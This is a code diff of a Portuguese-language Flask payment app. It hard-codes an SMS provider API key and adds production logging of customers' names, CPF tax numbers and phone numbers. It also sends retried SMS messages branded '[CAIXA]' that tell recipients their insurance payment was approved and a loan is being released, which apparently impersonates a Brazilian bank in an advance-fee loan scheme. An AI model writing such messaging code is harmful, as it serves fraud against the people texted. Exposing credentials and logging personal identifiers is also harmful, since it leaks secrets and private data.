@@ -216,12 +216,9 @@ def send_sms_smsdev(phone_number: str, message: str) -> bool:
     Send SMS using SMSDEV API
     """
     try:
-        # Get SMS API key from environment variables
-        sms_api_key = os.environ.get('SMSDEV_API_KEY')
-        if not sms_api_key:
-            app.logger.error("SMSDEV_API_KEY not found in environment variables")
-            return False
-
+        # Usar a chave de API diretamente que foi testada e funcionou
+        sms_api_key = "XFOQ8HUF4XXDBN16IVGDCUMEM0R2V3N4J5AJCSI3G0KDVRGJ53WDBIWJGGS4LHJO38XNGJ9YW1Q7M2YS4OG7MJOZM3OXA2RJ8H0CBQH24MLXLUCK59B718OPBLLQM1H5"
+        
         # Format phone number (remove any non-digits and ensure it's in the correct format)
         formatted_phone = re.sub(r'\D', '', phone_number)
         if len(formatted_phone) == 11:  # Include DDD
@@ -233,16 +230,33 @@ def send_sms_smsdev(phone_number: str, message: str) -> bool:
                 'msg': message
             }
 
-            # Make API request
-            response = requests.get('https://api.smsdev.com.br/v1/send', params=params)
+            # Log detail antes do envio para depuração
+            app.logger.info(f"[PROD] Enviando SMS via SMSDEV para {formatted_phone}. Payload: {params}")
 
-            app.logger.info(f"SMSDEV: SMS sent to {formatted_phone}. Response: {response.text}")
-            return response.status_code == 200
+            # Make API request with timeout
+            response = requests.get('https://api.smsdev.com.br/v1/send', params=params, timeout=10)
+            
+            # Analisar a resposta JSON se disponível
+            try:
+                response_data = response.json()
+                app.logger.info(f"[PROD] SMSDEV: SMS enviado para {formatted_phone}. Resposta: {response_data}")
+                
+                # Verificar se a mensagem foi colocada na fila
+                if response_data.get('situacao') == 'OK':
+                    app.logger.info(f"[PROD] SMS enviado com sucesso para {formatted_phone}, ID: {response_data.get('id')}")
+                    return True
+                else:
+                    app.logger.error(f"[PROD] Falha ao enviar SMS: {response_data}")
+                    return False
+            except Exception as json_err:
+                app.logger.error(f"[PROD] Erro ao analisar resposta JSON: {str(json_err)}")
+                # Se não conseguir parsear JSON, verificar apenas o status code
+                return response.status_code == 200
         else:
-            app.logger.error(f"Invalid phone number format: {phone_number}")
+            app.logger.error(f"[PROD] Formato inválido de número de telefone: {phone_number} (formatado: {formatted_phone})")
             return False
     except Exception as e:
-        app.logger.error(f"Error sending SMS via SMSDEV: {str(e)}")
+        app.logger.error(f"[PROD] Erro no envio de SMS via SMSDEV: {str(e)}")
         return False
 
 def send_sms_owen(phone_number: str, message: str) -> bool:
@@ -621,13 +635,33 @@ def check_payment_status(transaction_id):
         cpf = request.args.get('cpf', '')
         phone = request.args.get('phone', '')
         
+        # Logs detalhados de entrada para depuração
+        app.logger.info(f"[PROD] Verificando status do pagamento {transaction_id} para cliente: nome={nome}, cpf={cpf}, phone={phone}")
+        
+        # Validar dados do cliente
+        if not nome or not cpf:
+            app.logger.warning(f"[PROD] Dados incompletos do cliente ao verificar pagamento. nome={nome}, cpf={cpf}")
+        
+        if not phone:
+            app.logger.warning(f"[PROD] Telefone não fornecido para envio de SMS de confirmação: {transaction_id}")
+        else:
+            formatted_phone = re.sub(r'\D', '', phone)
+            if len(formatted_phone) != 11:
+                app.logger.warning(f"[PROD] Formato de telefone inválido: {phone} (formatado: {formatted_phone})")
+            else:
+                app.logger.info(f"[PROD] Telefone válido para SMS: {formatted_phone}")
+        
+        # Verificar status na API de pagamento
         api = get_payment_gateway()
         status_data = api.check_payment_status(transaction_id)
         app.logger.info(f"[PROD] Status do pagamento {transaction_id}: {status_data}")
         
         # Verificar se o pagamento foi aprovado
-        if status_data.get('status') == 'completed' or status_data.get('original_status') in ['APPROVED', 'PAID']:
-            app.logger.info(f"[PROD] Pagamento {transaction_id} aprovado. Enviando SMS com link de agradecimento.")
+        is_completed = status_data.get('status') == 'completed'
+        is_approved = status_data.get('original_status') in ['APPROVED', 'PAID']
+        
+        if is_completed or is_approved:
+            app.logger.info(f"[PROD] PAGAMENTO APROVADO: {transaction_id} - Status: {status_data.get('status')}, Original Status: {status_data.get('original_status')}")
             
             # Construir o URL personalizado para a página de agradecimento
             thank_you_url = request.url_root.rstrip('/') + '/obrigado'
@@ -638,19 +672,63 @@ def check_payment_status(transaction_id):
                 params['nome'] = nome
             if cpf:
                 params['cpf'] = cpf
+            if phone:
+                params['phone'] = phone
                 
             # Construir a URL completa com parâmetros
             if params:
                 thank_you_url += '?' + '&'.join([f"{key}={value}" for key, value in params.items()])
             
+            app.logger.info(f"[PROD] URL personalizado de agradecimento: {thank_you_url}")
+            
             # Enviar SMS apenas se o número de telefone estiver disponível
             if phone:
-                # Usando a função especializada para enviar SMS de confirmação de pagamento
-                success = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
-                if success:
+                app.logger.info(f"[PROD] Preparando envio de SMS para {phone}")
+                
+                # Fazer várias tentativas de envio direto usando SMSDEV
+                max_attempts = 3
+                attempt = 0
+                sms_sent = False
+                
+                while attempt < max_attempts and not sms_sent:
+                    attempt += 1
+                    try:
+                        app.logger.info(f"[PROD] Tentativa {attempt} de envio de SMS via SMSDEV diretamente")
+                        
+                        # Formatar o nome para exibição
+                        nome_formatado = nome.split()[0] if nome else "Cliente"
+                        
+                        # Mensagem personalizada com link para thank_you_url
+                        message = f"[CAIXA] Olá {nome_formatado}, seu pagamento do seguro foi aprovado! Seu empréstimo já está em processamento para liberação. Acesse sua página de status personalizada: {thank_you_url}"
+                        
+                        # Chamar diretamente a função SMSDEV
+                        sms_sent = send_sms_smsdev(phone, message)
+                        
+                        if sms_sent:
+                            app.logger.info(f"[PROD] SMS enviado com sucesso na tentativa {attempt} diretamente via SMSDEV")
+                            break
+                        else:
+                            app.logger.warning(f"[PROD] Falha ao enviar SMS diretamente na tentativa {attempt}/{max_attempts}")
+                            time.sleep(1.5)  # Intervalo maior entre tentativas
+                    except Exception as e:
+                        app.logger.error(f"[PROD] Erro na tentativa {attempt} de envio direto via SMSDEV: {str(e)}")
+                        time.sleep(1.0)
+                
+                # Tente a função especializada como backup se as tentativas diretas falharem
+                if not sms_sent:
+                    app.logger.warning(f"[PROD] Tentativas diretas falharam, usando função de confirmação de pagamento")
+                    sms_sent = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
+                
+                if sms_sent:
                     app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
                 else:
-                    app.logger.error(f"[PROD] Falha ao enviar SMS de confirmação para {phone}")
+                    app.logger.error(f"[PROD] Todas as tentativas de envio de SMS falharam para {phone}")
+        else:
+            app.logger.info(f"[PROD] Pagamento {transaction_id} ainda não aprovado. Status: {status_data.get('status')}")
+        
+        # Adicionar informações extras ao status para o frontend
+        status_data['phone_provided'] = bool(phone)
+        status_data['thank_you_url'] = thank_you_url if (is_completed or is_approved) else None
         
         return jsonify(status_data)
     except Exception as e:
